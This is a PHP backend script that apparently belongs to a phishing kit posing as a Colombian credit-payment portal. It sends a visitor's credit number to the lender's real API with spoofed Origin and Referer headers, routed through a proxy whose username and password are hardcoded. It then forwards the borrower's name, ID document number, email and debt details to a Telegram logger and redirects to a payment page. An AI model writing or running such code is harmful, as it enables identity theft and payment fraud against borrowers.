<?php
ob_start();
ini_set('display_errors', '0');
session_start();
require_once __DIR__ . '/includes/telegram-logger.php';
header('Content-Type: application/json; charset=utf-8');

// Configuración (puedes moverlo a un archivo de configuración)
define('API_URL', 'https://t3a9z73ceg.execute-api.us-east-1.amazonaws.com/prod/paymentez/1111111/oracle/get-user-info');
define('PROXY_HOST', 'gw.psbproxy.io');
define('PROXY_PORT', 823);
define('PROXY_USER', 'a797e8cd41dca9e41cc1__cr.co'); // Ajusta según formato
define('PROXY_PASS', 'ec775309c591edb9');
define('USE_PROXY', true); // Cambiar a false si no se quiere usar proxy

// Función para escribir logs (mejorada)
function writeApiDebugLog(array $context): void
{
    $logDir = __DIR__ . '/logs';
    $logFile = $logDir . '/api-debug.json'; // Usar JSON para estructura

    if (!is_dir($logDir)) {
        @mkdir($logDir, 0775, true);
    }

    $logEntry = array_merge([
        'timestamp' => date('Y-m-d H:i:s'),
        'session_id' => session_id(),
    ], $context);

    // Evitar exponer datos sensibles en logs (opcional)
    if (isset($logEntry['payload'])) {
        // Podrías ocultar partes del payload si es necesario
    }

    file_put_contents($logFile, json_encode($logEntry) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// Función para log a Telegram con contexto
function logTelegram($action, $data = [])
{
    // Asumiendo que telegram_log está definida en el include
    if (function_exists('telegram_log')) {
        telegram_log($action, $data);
    }
}

// Validar método y parámetros
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['creditNumber'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Debes ingresar el número de crédito.']);
    exit;
}

$creditNumber = trim($_POST['creditNumber']);

// Validación más estricta: solo alfanumérico y guiones, longitud 1-30
if (!preg_match('/^[A-Za-z0-9\-]{1,30}$/', $creditNumber)) {
    http_response_code(422);
    echo json_encode(['success' => false, 'message' => 'El número de crédito ingresado no es válido.']);
    exit;
}

// Log inicio
logTelegram('🔎 Búsqueda de crédito', [
    'Número de crédito' => $creditNumber,
    'IP' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
]);

// Preparar payload
$payload = json_encode([
    'creditNumber' => $creditNumber,
    'forceRequest' => true,
    'chanel' => 'test'
]);

// Configurar cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, API_URL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Origin: https://www.mobilize-fs.com.co',
    'Referer: https://www.mobilize-fs.com.co/portal-pagos/',
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Añadido

// Configurar proxy si está habilitado
if (USE_PROXY && defined('PROXY_HOST')) {
    curl_setopt($ch, CURLOPT_PROXY, PROXY_HOST . ':' . PROXY_PORT);
    if (defined('PROXY_USER') && defined('PROXY_PASS')) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, PROXY_USER . ':' . PROXY_PASS);
    }
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); // o CURLPROXY_SOCKS5 según necesites
}

// Ejecutar
$response = curl_exec($ch);
$errno = curl_errno($ch);
$error = curl_error($ch);
$httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Log detallado (sin exponer credenciales)
writeApiDebugLog([
    'step' => 'api_call',
    'creditNumber' => $creditNumber,
    'httpCode' => $httpCode,
    'curlErrno' => $errno,
    'curlError' => $error ?: 'ninguno',
    'responseLength' => strlen($response),
    'proxy_used' => USE_PROXY ? PROXY_HOST . ':' . PROXY_PORT : 'no',
]);

// Manejar error de cURL
if ($errno || $response === false) {
    logTelegram('❌ Error de conexión con la API', [
        'Número de crédito' => $creditNumber,
        'Error cURL' => curl_strerror($errno) ?: 'sin respuesta',
        'HTTP Code' => $httpCode,
    ]);
    http_response_code(502);
    echo json_encode(['success' => false, 'message' => 'Error de conexión con el servicio.']);
    exit;
}

// Decodificar respuesta
$data = json_decode($response, true);
$jsonError = json_last_error_msg();

if ($data === null && $jsonError !== 'No error') {
    // JSON inválido
    writeApiDebugLog([
        'step' => 'json_error',
        'creditNumber' => $creditNumber,
        'jsonError' => $jsonError,
        'rawResponse' => substr($response, 0, 500), // solo una parte para evitar logs enormes
    ]);
    logTelegram('⚠️ Respuesta JSON inválida', [
        'Número de crédito' => $creditNumber,
        'Error' => $jsonError,
    ]);
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'La respuesta del servicio no es válida.']);
    exit;
}

// Verificar si existe userInfo
if (isset($data['userInfo']) && is_array($data['userInfo'])) {
    $userInfo = $data['userInfo'];
    $concept = $data['paymentDescription'] ?? 'Pago credito RCI';
    $minPayment = $userInfo['PAGO_MINIMO'] ?? null;
    $totalDebt = $userInfo['PAGO_TOTAL'] ?? null;
    $dueDate = $userInfo['FECHA_VENCIMIENTO_PAGO'] ?? null;
    $valueToPay = $minPayment;

    // Guardar en sesión
    $_SESSION['userInfo'] = $userInfo;
    $_SESSION['creditNumber'] = $creditNumber;
    $_SESSION['payment'] = [
        'concept' => $concept,
        'minPayment' => $minPayment,
        'totalDebt' => $totalDebt,
        'dueDate' => $dueDate,
        'valueToPay' => $valueToPay,
    ];

    logTelegram('✅ Crédito encontrado', [
        'Número de crédito' => $creditNumber,
        'Nombre' => $userInfo['NOMBRE_COMPLETO'] ?? null,
        'Documento' => $userInfo['UNIQUE_ID_VALUE'] ?? null,
        'Correo' => $userInfo['EMAIL'] ?? null,
        'Pago mínimo' => $minPayment,
        'Deuda total' => $totalDebt,
        'Vencimiento' => $dueDate,
    ]);

    echo json_encode([
        'success' => true,
        'redirect' => 'detalle-pago.php'
    ]);
    exit;
}

// Si no se encontró userInfo
writeApiDebugLog([
    'step' => 'credit_not_found',
    'creditNumber' => $creditNumber,
    'httpCode' => $httpCode,
    'responseMessage' => $data['message'] ?? 'Sin userInfo en respuesta',
    'decoded' => $data,
]);

logTelegram('⚠️ Crédito no encontrado', [
    'Número de crédito' => $creditNumber,
]);

http_response_code(404); // o 200 pero con success false
echo json_encode([
    'success' => false,
    'message' => 'No encontramos información asociada a ese número de crédito.'
]);
